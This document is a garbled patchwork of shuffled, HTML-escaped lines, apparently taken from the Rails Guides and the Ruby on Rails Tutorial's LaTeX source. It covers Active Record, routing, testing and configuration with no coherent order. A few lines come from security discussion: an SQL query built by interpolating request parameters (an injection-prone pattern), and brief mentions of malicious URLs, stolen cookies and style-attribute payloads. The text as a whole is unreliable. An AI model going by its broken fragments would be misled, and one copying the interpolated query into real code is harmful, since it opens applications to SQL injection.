For example , if \ kode { flash &#91; : success &#93; = &quot; Welcome to the Sample App ! &quot; } , then the code
Category ▖ joins ( : articles )
By default `ActionView : : Partials : : PartialRenderer` has its object in a local variable with the same name as the template ▖
For example , we write
C ▖ descendants # = &gt; &#91; B &#93;
You are responsible for maintaining your database schema to match your associations ▖
&quot; Backoffice : : UsersController &quot; ▖ demodulize # = &gt; &quot; UsersController &quot;
# # # Running a Migration
validates : size , inclusion : { in : % w ( small medium large ) ,
# # # # JSON representation of Time objects
This can lead to two copies of an object getting out of sync :
config ▖ middleware ▖ delete &quot; ActionDispatch : : Cookies &quot;
A matter worth taking into consideration when writing functional tests is that ╼ the tests are going to be running on an application - the `test / dummy` ╼ application - rather than your engine ▖
array = &#91; &apos; string &apos; &#93;
If this was left as a typical `get` route , it could be possible for ╼ people to craft malicious URLs like this :
Creates a check box form input tag .
in Listing ~ \ ref { code : skip _ resize _ initializer } .
def symbolize _ keys
# examples within a transaction , remove the following line or assign false
Topic ▖ create ( title : nil ) ▖ valid ?
With polymorphic associations , a model can belong to more than one other model , on a single association ▖
A detailed diagram of MVC in Rails ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / mvc _ detailed-full ▖ png } { ( full size ) }
We &apos;ll cover validation errors in greater depth in the &#91; Working with Validation ╼ Errors &#93; ( # working-with-validation-errors ) section ▖
Place an encrypted version of the user &apos;s id in the browser cookies .
% r { ▖ } m ▖ multiline ?
&lt; % = form _ for : article , url : articles _ path do &#124; f &#124; % &gt;
/ Users / mhartl / rails _ projects / sample _ app / config
In the \ emph { Ruby on Rails Tutorial } , we &apos;ll take the ( nearly ) polar opposite approach : although Chapter ~ \ ref { cha : a _ toy _ app } will develop a small toy app using scaffolding , the core of the \ emph { Rails Tutorial } is the sample app , which we &apos;ll start writing in Chapter ~ \ ref { cha : static _ pages } .
The result is the user \ href { http : / / localhost : 3000 / users / 1 } { \ texttt { show } } page , as seen in Figure ~ \ ref { fig : demo _ show _ user _ rails _ 3 } .
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 1 ▖ 4 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
We first saw microposts in larval form in Chapter ~ \ ref { cha : a _ demo _ app } , and in this chapter we will make a full-strength version of the sketch from Section ~ \ ref { sec : microposts _ resource } by constructing the Micropost data model , associating it with the User model using the \ kode { has \ _ many } and \ kode { belongs \ _ to } methods , and then making the forms and partials needed to manipulate and display the results ( including , in Section ~ \ ref { sec : micropost _ images } , uploaded images ) .
# # # Verifying Bug Reports
each time until the tests pass .
* development environment :
We have ╼ &#91; Travis CI &#93; ( https : / / travis-ci ▖ org / rails / rails ) as a safety net for catching ╼ unexpected breakages elsewhere .
You can turn off debug mode by updating `config / environments / development ▖ rb` to ╼ include :
The sample app with nicely styled logo .
# # # # CSS and ERB
config ▖ middleware ▖ swap ActionDispatch : : ShowExceptions , Lifo : : ShowExceptions
As we saw briefly before in the Chapter ~ \ ref { cha : a _ toy _ app } exercises , the way to validate the presence of the name attribute is to use the \ kode { validates } method with argument \ kode { presence : true } , as shown in Listing ~ \ ref { code : validates _ presence _ of _ name } .
It &apos;s possible that this will generate a Relationship factory , which you should remove :
&lt; p &gt; Hello , Rails !
# = &gt; &#91;
As we &apos;ll see starting in Section ~ \ ref { sec : following } , our user interface won &apos;t allow this to happen , but adding a unique index arranges to raise an error if a user tries to create duplicate relationships anyway ( for example , by using a command-line tool such as \ texttt { curl } ) .
* You could use an `after _ action` to do similar setup as a `before _ action` but ╼ using instance variables set in your mailer action .
Testing for the \ kode { password } and \ kode { password \ _ confirmation } attributes .
Luckily , humans are quite good at making generalizations from concrete examples ; here are a few more , including a couple using the \ kode { map } method :
Change the `belongs _ to` association inside this model ╼ ( `app / models / blorgh / article ▖ rb` ) to this :
belongs _ to : section
As in Section ~ \ ref { sec : the _ hello _ application } , we &apos;ll start by generating the application skeleton using the \ kode { rails new } command with a specific Rails version number :
If you want to use the new `JSON`-based format ╼ in your application , you can add an initializer file with the following content :
Try running
We can get the new test in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ test } to pass by adding \ kode { uniqueness : true } to the \ kode { email } validation , as shown in Listing ~ \ ref { code : validates _ uniqueness _ of _ email } .
By default , \ emph { all } model attributes are accessible .
This isn &apos;t as hard as it sounds , because Rails has generated useful example tests for us ( Listing ~ \ ref { code : generated _ user _ mailer _ test } ) .
* You may not have write access to your production file system .
This action is now displaying the parameters for the article that are coming in ╼ from the form ▖
&lt; % = f ▖ text _ field : last _ name % &gt;
The name is motivated by the common description of Twitter as a \ emph { microblog } ; since blogs have posts , microblogs should have microposts .
# Be sure to restart your server when you modify this file .
An example of such a table appears in Figure ~ \ ref { fig : users _ table } , corresponding to the data model shown in Figure ~ \ ref { fig : user _ model _ sketch } .
Moreover , such helpers are automatically included in Rails views ; by including the module into the base class of all controllers ( the Application controller ) , we arrange to make them available in our controllers as well ( Listing ~ \ ref { code : sessions _ helper _ include } ) .
To define a concern :
Defaults to ` &apos; encrypted cookie &apos; ` .
Client ▖ where ( &quot; orders _ count = # { params &#91; : orders &#93; } &quot; )
# # # Adding links
&lt; % = f ▖ text _ field : first _ name % &gt;
class _ attribute : table _ name _ prefix , instance _ writer : false
As a consequence `false` can &apos;t be a used as a padding value .
# # # Sending Emails without Template Rendering
The ╼ default error message for this option is _ &quot; must be less than % { count } &quot; _ .
A green ( passing ) test ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / green _ passing _ spec _ 4 _ 0-full ▖ png } { ( full size ) }
&#124; * * Redirection * * &#124; 300 &#124; : multiple _ choices &#124;
First , let &apos;s create a simple `User` scaffold :
This error indicates that Rails cannot find the `new` action inside the ╼ `ArticlesController` that you just generated ▖
This technique is useful caching pieces like menus , lists of news topics , static HTML fragments , and so on ▖
&quot; spec / requests / authentication _ pages _ spec ▖ rb &quot;
% Q ( &lt; div class = &quot; field _ with _ errors &quot; &gt; # { html _ tag } &lt; / div &gt; ) ▖ html _ safe
So far we &apos;ve only rejected blank email addresses ; in this section , we &apos;ll require email addresses to conform to the familiar pattern \ kode { user @ example ▖ com } .
The `form _ for` call here uses ╼ an array , which will build a nested route , such as ` / articles / 1 / comments` .
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
Most of the screenshots in this book use Google Chrome , but Figure ~ \ ref { fig : home _ view _ full _ html } uses Safari because Chrome doesn &apos;t display the full page title .
The result of the above discussion is the user / relationship association shown in Listing ~ \ ref { code : user _ relationships _ association } and Listing ~ \ ref { code : relationship _ belongs _ to } .
Note that an object instantiated with `new` will not report errors even if it &apos;s ╼ technically invalid , because validations are not run when using `new` .
If you want to see the average of a certain number in one of your tables you can call the `average` method on the class that relates to the table ▖
/ / = require home
The Home page with a form error .
We will thus have to tell Rails the model class name to look for .
* * `ActionDispatch : : DebugExceptions` * *
The application code , which introduces the \ kode { redirect \ _ to } method , appears in Listing ~ \ ref { code : user _ create _ action } .
Then merge the changes back into the master branch using the same technique as in Section ~ \ ref { sec : git _ commands }
Since we don &apos;t want to display debug information to users of a deployed application , Listing ~ \ ref { code : rails _ debug } uses
class C &lt; B ; end
Eager loading may trigger more than one query under the hood , and some queries ╼ may need the results of previous ones ▖
The easiest solution is to suppress the feed entirely by assigning it an empty array , as shown in Listing ~ \ ref { code : microposts _ create _ action _ with _ feed } .
We start by defining two time intervals .
╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : sign _ up _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
render action : &quot; edit ▖ html ▖ erb &quot;
The methods `beginning _ of _ month` and `end _ of _ month` return the dates for the beginning and end of the month :
That is , it works , but it &apos;s not the Rails way .
* `edit _ geocoder _ path` returns ` / geocoder / edit`
# ▖ ▖ ▖ ▖ ▖ .
Returns a new Micropost object associated with \ kode { user }
This will create a Rails application called Blog in a `blog` directory and ╼ install the gem dependencies that are already mentioned in `Gemfile` using ╼ `bundle install` .
= &gt; &quot; test &quot;
There &apos;s a new choice for sanitizing HTML fragments in your applications ▖
It works in this case because the Rails console automatically includes the Rails extensions to Ruby .
Gravatar is a free service that allows users to upload images and associate them with email addresses they control .
╼ end
To get code like \ kode { @ user ▖ microposts ▖ build } to work , we need to update the User and Micropost models with code to associate them .
following-users
use ActionDispatch : : DebugExceptions
By the end of it , though , we will have created an industrial-strength system for validating , storing , and retrieving user information .
This is in contrast to the popular open-source version control system called Subversion , in which a commit necessarily makes changes on a remote repository .
The micropost index page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / microposts } { / microposts } ) .
This is the first time we &apos;ve seen the command to create a test database with the correct structure :
# = &gt; { name : &#91; &quot; can &apos;t be blank &quot; &#93; }
See the &#91; configuration section in the Action Mailer guide &#93; ( http : / / guides ▖ rubyonrails ▖ org / action _ mailer _ basics ▖ html # action-mailer-configuration ) for more info .
* `config ▖ log _ tags` accepts a list of methods that the `request` object responds to ▖
Since a micropost creation form only makes sense in the context of a particular signed-in user , one goal of this section will be to serve different versions of the Home page depending on a visitor &apos;s signin status .
Defaults to `-i -t` ▖ &lt; / li &gt; &lt; / ul &gt; &#124;
# # # # `singularize`
Since it is possible to embed ERB in your `config / database ▖ yml` it is best practice to explicitly show you are using the `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` to connect to your database ▖
So the payload is in the style attribute ▖
NOTE : Defined in `active _ support / core _ ext / range / overlaps ▖ rb` .
has _ one : account , - &gt; { where &quot; confirmed = 1 &quot; }
A mockup of the Home page with a proto-feed ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / proto _ feed _ mockup _ bootstrap-full ▖ png } { ( full size ) }
super
By comparing hashed values instead of raw passwords , we will be able to authenticate users without storing the passwords themselves .
With that , our layout has links to all the static pages created in Chapter ~ \ ref { cha : static _ pages } , so that , for example , \ href { http : / / localhost : 3000 / about } { / about } goes to the About page ( Figure ~ \ ref { fig : about _ page } ) .
Also note that the line
I18n ▖ locale = : de
You can also specify constraints as a lambda :
In other words , \ emph { all } our pages are identical in structure , including the contents of the title tag , with the sole exception of the material inside the \ kode { body } tag .
* ` : restrict _ with _ error` causes an error to be added to the owner if there are any associated objects
Also note the use of the \ kode { remember \ _ digest } attribute , which is the same as \ kode { self ▖ remember \ _ digest } and , like \ kode { name } and \ kode { email } in Chapter ~ \ ref { cha : modeling _ users } , is created automatically by Active Record based on the name of the corresponding database column ( Listing ~ \ ref { code : add _ remember _ digest _ to _ users _ generated } ) .
self ▖ primary _ key = &quot; product _ id &quot;
README ▖ rdoc &#124; 243 --------------------------------------------------
In this particular case , you should first try stopping the processes with the \ texttt { spring } command itself :
Unfortunately , there &apos;s one more change we need to make to be assured of email uniqueness , which is to make sure that the email address is all lower-case before it gets saved to the database .
# Sign the user in and redirect to the user &apos;s show page .
Assets can still be placed in the `public` hierarchy ▖
furnished to do so , subject to the following conditions :
This practice couples the test tightly to the implementation , and we would have to change it everywhere if the implementation changed .
Note that when using partial writes , you should also use optimistic locking `config ▖ active _ record ▖ lock _ optimistically` since concurrent updates may write attributes based on a possibly stale read state ▖
They just won &apos;t get backported to maintenance branches .
I shall be late ! &quot; ▖ truncate ( 18 , separator : &apos; &apos; )
▖ ▖ .
Not very DRY , eh ?
as shown in Listing ~ \ ref { code : basic _ signup _ tests } .
To test the engine , ╼ there is a cut-down version of a Rails application embedded within it at ╼ `test / dummy` ▖
Of course this URL does not exist , so the browser displays nothing ▖
But web developers &apos; understanding of how best to authenticate users has matured enough that it now comes bundled with the latest version of Rails .
We &apos;ll learn more about HTTP request methods starting in Section ~ \ ref { sec : TDD } .
In previous versions when you defined a `default _ scope` in a model ╼ it was overridden by chained conditions in the same field ▖
Because of the \ kode { navbar-fixed \ -top } class in the \ kode { header } tag , Bootstrap fixes the navigation bar to the top of the page , so the padding serves to separate the main text from the navigation .
Routes provided by the sessions rules in Listing ~ \ ref { code : sessions _ resource } .
$ ARCONN = sqlite3 ruby -Itest test / cases / associations / has _ many _ associations _ test ▖ rb
I &apos;ve heard especially good things about RubyMine , and one reader ( David Loeffler ) has assembled \ href { https : / / github ▖ com / perfectionist / sample _ project / wiki } { notes on how to use RubyMine with this tutorial }
# # # # CSS and Sass
# In Barcelona , 2010 / 03 / 28 02 : 00 + 0100 becomes 2010 / 03 / 28 03 : 00 + 0200 due to DST .
The view in Listing ~ \ ref { code : will _ paginate _ index _ view } doesn &apos;t work yet , though , because currently \ kode { @ users } contains the results of \ kode { User ▖ all } ( Listing ~ \ ref { code : user _ index } ) , whereas \ kode { will \ _ paginate } requires that we paginate the results explicitly using the \ kode { paginate } method :
Following the scaffolding approach risks turning you into a virtuoso script generator with little ( and brittle ) actual knowledge of Rails .
else
For example :
The \ kode { belongs \ _ to } relationship between a micropost and its associated user .
as shown in Listing ~ \ ref { code : unicorn _ gemfile } .
&lt; head &gt;
&lt; span class = &apos; exercise &apos; id = &apos; ex-b6b114 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection generated _ static _ pages ( end ) ╼ ╼ \ subsection { Custom static pages } % ( fold ) ╼ \ label { sec : custom _ static _ pages } ╼ ╼
This tutorial assumes that most readers are using Ruby ~ 1 ▖ 9 ▖ 3 or 2 ▖ 0 ▖ 0 , but Ruby 1 ▖ 9 ▖ 2 should work as well .
You may use the ` : root` option to ensure a consistent root element .
What if you need to follow a different naming convention or need to use your ╼ Rails application with a legacy database ?
\ emph { Note } : If you would like to install \ emph { all } the gems needed for the sample application , you should use the code in Listing ~ \ ref { code : final _ gemfile } at this time .
A Rake task for seeding the database with sample users .
* Include tests that fail without your code , and pass with it .
We briefly encountered a similar issue in Section ~ \ ref { sec : updating _ and _ deleting _ users _ conclusion } in the context of the users index .
In Chapter ~ \ ref { cha : a _ demo _ app } , we &apos;ll make a second project , whose purpose is to demonstrate the basic workings of a Rails application .
Every association will attempt to automatically find the inverse association ╼ and set the ` : inverse _ of` option heuristically ( based on the association name ) .
Before submitting a valid registration in a browser , we &apos;re going to add a bit of polish common in web applications : a message that appears on the subsequent page ( in this case , welcoming our new user to the application ) and then disappears upon visiting a second page or on page reload .
Such ╼ is the open source life .
╼ / log / * ▖ log ╼ / tmp ╼ ╼ # Ignore Spring files .
( In fact , we &apos;ve already used \ kode { alert-danger } once , to style the error message div in Listing ~ \ ref { code : errors _ partial } ▖ )
Detailed examples of the common database connections are below .
Defining a database index improves lookup efficiency while allowing enforcement of uniqueness at the database level .
In Chapter ~ \ ref { cha : following _ users } , we &apos;ll complete our tiny Twitter clone by adding the notion of \ emph { following } users in order to receive a \ emph { feed } of their microposts .
Please ignore ( or fix ! ) them , if any , and submit patches that do not issue new warnings .
We &apos;ll start by writing tests for the titles , then add the titles themselves , and finally use a \ emph { layout } file to refactor the resulting pages and eliminate duplication .
Adding a backtrace silencer for RVM .
( On some systems , you may have to restart the Rails server at this point ▖ )
The Users controller in schematic form .
&#124; `delivery _ method` &#124; Defines a delivery method ▖
The initial failed login , with \ kode { create } as in Listing ~ \ ref { code : initial _ create _ session } .
&lt; % = stylesheet _ link _ tag &quot; application &quot; , media : &quot; all &quot; , &quot; data-turbolinks-track &quot; = &gt; true % &gt;
Once we &apos;ve created objects , we often want to update them .
On subsequent signin attempts , the forwarding URL should revert to the default ( i ▖ e ▖ , the profile page ) .
# # # Routing to Rack Applications
What we want to do is select from the \ kode { microposts } table all the microposts with ids corresponding to the users being followed by a given user ( or the user itself ) .
Now , suppose we wanted to add a new order for an existing customer ▖
An object like a string , for example , can respond to the message \ kode { length } , which returns the number of characters in the string :
We &apos;ll opt for the final of these options : when users sign in , we will remember their signin status ``forever &apos; &apos; , clearing the session only when the user explicitly signs out .
@ patient = Patient ▖ find ( 17 )
All items must respond to `to _ xml` , an exception is raised otherwise .
The code in Listing ~ \ ref { code : validates _ content _ presence } shows how to add a validation for the presence of micropost content in order to ensure that microposts can &apos;t be blank .
For example , did you know that \ kode { &quot; Michael Hartl &quot; @ example ▖ com } , with quotation marks and a space in the middle , is a valid email address according to the standard ?
Here are the steps for getting started with the cloud development environment :
In fact , using Rails even for static pages yields a distinct advantage : we can easily add just a \ emph { small } amount of dynamic content .
&lt; / small &gt;
The user profile with microposts ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 } { / users / 1 } ) .
now ▖ utc # = &gt; Mon , 07 Jun 2010 23 : 27 : 52 + 0000
create _ table : appointments do &#124; t &#124;
Here the sample relationships are created using the code
following
# # # `include ?
The `find _ by` method finds the first record matching some conditions ▖
Matching HTML
The inheritance hierarchy for the User and Micropost models .
By default Rails ships with three environments : &quot; development &quot; , &quot; test &quot; , and &quot; production &quot; ▖
The `last` method finds the last record ordered by the primary key ▖
The key is to check all three requirements for the feed : microposts for both followed users and the user itself should be included in the feed , but a post from an \ emph { unfollowed } user should not be included .
date = Date ▖ new ( 2010 , 6 , 6 )
This command does such and such .
# # # `errors`
The awesome \ href { http : / / www ▖ rubular ▖ com / } { Rubular } regular expression editor .
@ comment = @ article ▖ comments ▖ find ( params &#91; : id &#93; )
belongs _ to : continent
As with the signup form , we can test the signin form by using Capybara to fill in the form values and then click the button .
gem &apos; blorgh &apos; , path : &quot; vendor / engines / blorgh &quot;
A test for an invalid signup ▖
To build a form for creating microposts , we use the code in Listing ~ \ ref { code : microposts _ home _ page } , which serves up different HTML based on whether the site visitor is logged in or not .
The default location for the manifest is the root of the location specified in ╼ `config ▖ assets ▖ prefix` ( &apos; / assets &apos; by default ) .
You can use this method when you want to say that the object is invalid , no matter the values of its attributes ▖
The same goes for \ kode { rake } , etc ▖ :
If you create a `has _ and _ belongs _ to _ many` association , you need to explicitly create the joining table ▖
The method here is to make a user with the same email address as \ kode { @ user } using \ kode { @ user ▖ dup } , which creates a duplicate user with the same attributes .
class CreateAccountHistories &lt; ActiveRecord : : Migration
Then we can make the corresponding replacements for the Help and About pages ( Listing ~ \ ref { code : help _ view _ erb _ title } and Listing ~ \ ref { code : about _ view _ erb _ title } ) .
Where ` &lt; attribute &gt; ` is the attribute you asked for ▖
Unlike plain JavaScript files , JS-ERb files also allow the use of Embedded Ruby , which we apply in the \ kode { create ▖ js ▖ erb } file to update the follow form with the \ kode { unfollow } partial ( which is what should show after a successful following ) and update the follower count .
The following changes are meant for upgrading your application to Rails 3 ▖ 1 ▖ 12 , the last 3 ▖ 1 ▖ x version of Rails .
Eventually , we will test that the feed returns the microposts of the users being followed , but for now we &apos;ll just test that the \ kode { feed } method \ emph { includes } the current user &apos;s microposts but \ emph { excludes } the posts of a different user .
The default value is ` : log` in development and test environments , and `false` in all other environments .
Because email format validation is tricky and error-prone , we &apos;ll start with some passing tests for \ emph { valid } email addresses to catch any errors in the validation .
When making Time comparisons using methods which honor the user time zone , make sure to use `Time ▖ current` instead of `Time ▖ now` ▖
do _ something _ else
And we &apos;ll also add one to the `app / views / articles / show ▖ html ▖ erb` template as ╼ well , so that there &apos;s also an &quot; Edit &quot; link on an article &apos;s page ▖
&lt; / head &gt;
scope shallow _ path : &quot; sekret &quot; do
* `ActionDispatch : : Callbacks ▖ to _ prepare` takes a block to run after `ActionDispatch : : Callbacks ▖ before` , but before the request ▖
rest = hash ▖ slice ! ( : a ) # = &gt; { : b = &gt; 2 }
resources : photos , : accounts
_ If you want to allow custom colors or images , you can allow the user to choose them and build the CSS in the web application _ ▖
* How to use dynamic finders methods .
This section gives a high-level overview of the asset pipeline and then shows how to use a remarkable tool for making CSS called \ emph { Sass } , now included by default as part of the asset pipeline .
The data model then appears as in Figure ~ \ ref { fig : user _ has _ many _ followers } .
Efficiency in production
Then do the same for the `app / views / articles / edit ▖ html ▖ erb` view :
You need to balance several factors : the need for new features , the increasing difficulty of finding support for old code , and your available time and skills , to name a few .
First , we will need to know about the dollar-sign syntax to access a DOM element based on its unique CSS ~ id .
class Category &lt; ActiveRecord : : Base
If you need to use a dot within a dynamic segment , add a constraint that overrides this – for example , `id : / &#91; ^ \ / &#93; + / ` allows anything except a slash .
Rack provides a minimal , modular and adaptable interface for developing web applications in Ruby ▖
That completes the comment function of the blogging engine ▖
$ cd activerecord
You can configure your own builder with the ` : builder` option ▖
SELECT * FROM clients LIMIT 10
time _ zone _ select ( &quot; user &quot; , &quot; time _ zone &quot; )
------------------
If you &apos;re using your own system and see no output when running the command in Listing ~ \ ref { code : cat _ public _ key } , follow the instructions on \ href { https : / / confluence ▖ atlassian ▖ com / x / YwV9E } { how to install a public key on your Bitbucket account } .
Adding the uploader to the Micropost model gives the code shown in Listing ~ \ ref { code : micropost _ model _ picture } .
But the whole point of using bcrypt is for hashing to be irreversible , so this can &apos;t be right .
# location : &apos; / usr / sbin / sendmail &apos; ,
class B &lt; C ; end
We &apos;ll start by adding a ``forgot password &apos; &apos; link to the sample application &apos;s login form ( Figure ~ \ ref { fig : login _ forgot _ password _ mockup } ) .
end _ of _ quarter ( at _ end _ of _ quarter )
Here , the ` _ ad _ banner ▖ html ▖ erb` and ` _ footer ▖ html ▖ erb` partials could contain content that is shared among many pages in your application ▖
bytes
as shown in Listing ~ \ ref { code : generate _ user _ mailer } .
The syntax is potentially confusing , and it &apos;s important to understand that in the code above only \ emph { one } of the lines gets executed .
This means that the \ emph { routing } works , but the corresponding pages don &apos;t necessarily work at this point .
We &apos;ll learn how to model such user relationships , and see the implications for the microposts feed , in Chapter ~ \ ref { cha : following _ users } .
╼ &gt; &gt; 1 ▖ year ▖ from _ now
It &apos;s worth mentioning that the content need not be an exact match ; any substring works as well , so that
The find would then take the form :
Defaults to ` : file _ store` if the directory `tmp / cache` exists , and to ` : memory _ store` otherwise .
The first step in adding custom CSS to our application is to open a file to contain it :
Attempts to install 2 ▖ 1 ▖ 5 also failed .
By default , the engine &apos;s controllers inherit from ╼ `Blorgh : : ApplicationController` ▖
get &apos; こんにちは &apos; , controller : &apos; welcome &apos; , action : &apos; index&apos;
&lt; a href = &quot; # &quot; onclick = &quot; this ▖ style ▖ backgroundColor = &apos; # 990000 &apos; &quot; &gt; Paint it red &lt; / a &gt;
And then on our page :
╼ ╼ % = lang : console ╼ \ begin { code } ╼ $ git checkout -b filling-in-layout ╼ \ end { code } ╼ ╼ \ subsection { Site navigation } % ( fold ) ╼ \ label { sec : adding _ to _ the _ layout } ╼ ╼ As a first step toward adding links and styles to the sample application , we &apos;ll
It &apos;s common to have resources that are logically children of other resources ▖
We left Section ~ \ ref { sec : unsuccessful _ edits } with a working edit form .
= &gt; &#91; &quot; foo &quot; , &quot; bar &quot; , &quot; baz &quot; &#93;
Both `next _ week` and `prev _ week` work as expected when `Date ▖ beginning _ of _ week` or `config ▖ beginning _ of _ week` are set .
Rails now creates routes to the `CategoriesController` .
&lt; % end % &gt;
All of these lessons , of course , apply ╼ to vanilla JavaScript as well .
Our first step is to generate an integration test as usual :
As with sessions ( Section ~ \ ref { sec : sessions _ and _ failed _ signin } ) , we &apos;ll model account activations as a resource even though they won &apos;t be associated with an Active Record model .
You may notice that there are more actions than there are pages ; the \ kode { index } , \ kode { show } , \ kode { new } , and \ kode { edit } actions all correspond to pages from Section ~ \ ref { sec : a _ user _ tour } , but there are additional \ kode { create } , \ kode { update } , and \ kode { destroy } actions as well .
If you want to assign an object to a `has _ and _ belongs _ to _ many` association without saving the object , use the `collection ▖ build` method .
For example :
Testing for the \ kode { : name } and \ kode { : email } attributes .
# # # # `app` Directory
Moreover , by using \ kode { get } we arrange for the route to respond to a \ texttt { GET } request , which is one of the fundamental
Note also the use of \ kode { @ user ▖ reload } ( first seen in Section ~ \ ref { sec : updating _ user _ objects } ) to reload the user &apos;s values from the database and confirm that they were successfully updated .
Note how similar the final step is to logging a user in , where we retrieve the user by email address and then verify ( using the \ kode { authenticate } method ) that the submitted password matches the password digest ( Listing ~ \ ref { code : log _ in _ success } ) .
After restarting Sublime Text , the RubyTest package supplies the following commands :
Since we have already done one push ( Section ~ \ ref { sec : bitbucket } ) , on most systems we can omit \ kode { origin master } , and simply run \ kode { git push } :
Although REST theory is rather abstract , in the context of Rails applications REST means that most application components ( such as users and microposts ) are modeled as \ emph { resources } that can be created , read , updated , and deleted---operations that correspond both to the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Create , _ read , _ update _ and _ delete } { CRUD operations of relational databases } and four fundamental \ href { http : / / en ▖ wikipedia ▖ org / wiki / HTTP _ request # Request _ methods } { HTTP request methods } : \ texttt { POST } , \ texttt { GET } , \ texttt { PATCH } , and \ texttt { DELETE } ▖ (
The Home page with status feed and incremented following count .
\ emph { URI } stands for Uniform Resource Identifier , while the slightly less general \ emph { URL } stands for Uniform Resource Locator .
The code \ kode { user ▖ microposts ▖ build ( ▖ ▖ ▖ ) } returns a new Micropost object automatically associated with the given user .
Rails &apos; \ kode { has \ _ many : through } allows the modeling of complicated data relationships .
To unify these cases , we can pass the form variable ~ \ kode { f } to the partial and access the associated object through \ kode { f ▖ object } , so that in
Note ╼ that each associated object will contain its own `errors` collection ; errors do ╼ not bubble up to the calling model .
Adding sample microposts for \ emph { all } the users actually takes a rather long time , so first we &apos;ll select just the first six users ( i ▖ e ▖ , the five users with custom Gravatars , and one with the default Gravatar ) using the \ kode { take } method :
If the first matching route is :
foo : bar
Our first step is to write a failing test for the About page .
route resources : users
Note from Table ~ \ ref { table : demo _ RESTful _ users } that there is some overlap in the URLs ; for example , both the user \ kode { show } action and the \ kode { update } action correspond to the URL / users / 1 .
But the attacker can review their web server &apos;s access log files to see the victim &apos;s cookie .
We &apos;ll then use the failing test to drive the writing of the application code .
# # # # `take`
* `customers / _ customer ▖ html ▖ erb`
You can also pass in a `layout : &apos; layout _ name &apos; ` option to the render call inside ╼ the format block to specify different layouts for different formats :
no changes added to commit ( use &quot; git add &quot; and / or &quot; git commit -a &quot; )
TIP : For further details have a look at the docs of your production web server :
This prevents userless microposts from being stranded in the database when admins choose to remove users from the system .
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 2 ▖ 0 ▖ rc2 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
Indeed , the Bootstrap framework defines a large number of variables for colors , available online on the \ href { http : / / bootstrapdocs ▖ com / v2 ▖ 0 ▖ 4 / docs / less ▖ html } { Bootstrap page of LESS variables } .
Moreover , persistent sessions are cumbersome to check by hand , so if we ever want to refactor the \ kode { current \ _ user } method ( as we will in Chapter ~ \ ref { cha : account _ activation } ) it &apos;s important to test it .
To check that the new test in Listing ~ \ ref { code : layout _ links _ test } passes , we can run just the integration tests using the following Rake task :
Technically , Rails converts the argument of \ kode { has \ _ many } to a class name using the \ kode { classify } method , which converts \ kode { &quot; foo \ _ bars &quot; } to \ kode { &quot; FooBar &quot; } .
NOTE : Defined in `active _ support / core _ ext / module / delegation ▖ rb`
to : &apos; static _ pages # contact &apos; ╼ end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection rails _ routes ( end ) ╼ ╼ \ subsection { Using named routes } % ( fold ) ╼ \ label { sec : named _ routes } ╼ ╼
( We won &apos;t be using Sass until Section ~ \ ref { sec : sass } , but it &apos;s needed now for the \ texttt { bootstrap-sass } gem to work its magic ▖ )
&quot; dude &quot; ▖ pluralize ( 2 ) # = &gt; &quot; dudes &quot;
# # # Testing Patches
Error messages for a failed micropost creation .
Your goal should be to create and configure both the development database and the test database to use PostgreSQL .
This links the folder specified in `config ▖ assets ▖ prefix` to `shared / assets` .
Extensions to `BigDecimal`
You can add a new middleware to the middleware stack using any of the following methods :
Usually Mac OS X and Windows come with a JavaScript runtime installed ▖ ╼
# Defines the matching rules for Guard .
as shown in Listing ~ \ ref { code : curl _ rails _ png } .
end of regex
Once you have configured your server and your CDN when you serve a webpage that ╼ has an asset :
Let &apos;s see if our \ kode { save } changed anything :
With the added integration test for layout links , we are now in a good position to catch regressions quickly using our test suite .
If you don &apos;t want to use a generator , you could create your own file inside of ╼ `app / jobs` , just make sure that it inherits from `ActiveJob : : Base` .
In contrast to the persistent cookie created by the \ kode { cookies } method ( Section ~ \ ref { sec : remember _ me } ) , the temporary cookie created by the \ kode { session } method expires immediately when the browser is closed .
head : created , location : photo _ path ( @ photo )
exabytes
As a result of the callback , when a new user is defined with \ kode { User ▖ new } ( as in user signup , Listing ~ \ ref { code : create _ action _ strong _ parameters } ) , it will automatically get both \ kode { activation \ _ token } and \ kode { activation \ _ digest } attributes ; because the latter is associated with a column in the database ( Figure ~ \ ref { fig : user _ model _ account _ activation } ) , it will be written automatically when the user is saved .
To make these collections , it &apos;s worth knowing about the useful \ kode { \ % w &#91; &#93; } technique for making arrays of strings , as seen in this console session :
That &apos;s remarkably important for libraries .
Rails 2 ▖ 1 ▖ 2 escapes these characters for the Location field in the `redirect _ to` method ▖
In the process , we &apos;ll learn about some of the most powerful features of Rails , including image upload , custom database queries , and advanced data modeling with \ kode { has \ _ many } and \ kode { has \ _ many : through } .
( Testing for this is left as an exercise ( Section ~ \ ref { sec : exercises _ friendly _ forwarding } ) ▖ )
A \ kode { Gemfile } for the toy app .
# If you &apos;re not using ActiveRecord , or you &apos;d prefer not to run each of your
This updates the database at Heroku with the necessary user / micropost data model .
Active Record insulates you from the need to use SQL in most cases .
2 ▖ ordinal # = &gt; &quot; nd &quot;
# Ignore bundler config .
The default middlewares shown here ( and some others ) are each summarized in the &#91; Internal Middlewares &#93; ( # internal-middleware-stack ) section , below .
now ▖ change ( min : 0 )
Over the course of the next five chapters , we &apos;ll fulfill the promise implicit in this incipient signup page .
sign _ out
This uses the \ kode { to } method because we expect a click on the signup button with valid data \ emph { to } change the user count by one .
If a change is related to a specific issue , you should attach the issue &apos;s number ▖
